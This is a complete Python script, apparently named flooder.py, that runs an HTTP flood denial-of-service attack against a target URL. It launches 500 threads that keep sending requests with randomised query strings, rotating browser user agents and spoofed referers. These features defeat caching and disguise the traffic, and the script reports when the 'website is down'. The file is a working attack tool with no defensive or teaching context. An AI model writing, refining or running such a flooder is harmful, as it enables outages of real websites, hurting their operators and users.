import urllib.request
import sys
import threading
import random
import re

url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0')
    headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36')
    headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68')
    headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36')
    headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36')
    return headers_useragents

def referer_list():
    global headers_referers
    headers_referers.append('http://www.google.com/')
    headers_referers.append('http://www.usatoday.com/')
    headers_referers.append('http://engadget.search.aol.com/')
    headers_referers.append('http://' + host + '/')
    return headers_referers

def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str

def usage():
    print("Usage: python flooder.py <url> [safe]\n")

def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    
    full_url = url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'keep-alive',
        'Host': host
    }
    
    request = urllib.request.Request(full_url, headers=headers)
    
    try:
        with urllib.request.urlopen(request) as response:
            inc_counter()
            code = response.getcode()
    except urllib.error.HTTPError as e:
        set_flag(1)
        print('A package of: 65000 Bytes')
        code = 500
    except urllib.error.URLError as e:
        print(e.reason)
        sys.exit()
    
    return code

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception as ex:
            pass

class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                print("%d Requests Sent" % request_counter)
                previous = request_counter
        if flag == 2:
            print("\n 1) The website is down. \n2)Stopping the flood.")
            sys.exit()

if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        
        input_url = sys.argv[1]
        
        if not (input_url.startswith("http://") or input_url.startswith("https://") or input_url.startswith("www.")):
            url = "http://" + input_url
        else:
            url = input_url
        
        m = re.search(r'http[s]?://(?:www\.)?([^/]+)', url)
        if m:
            host = m.group(1)
        else:
            print("Invalid URL format.")
            sys.exit()
        
        for i in range(500):
            t = HTTPThread()
            t.start()
        
        t = MonitorThread()
        t.start()
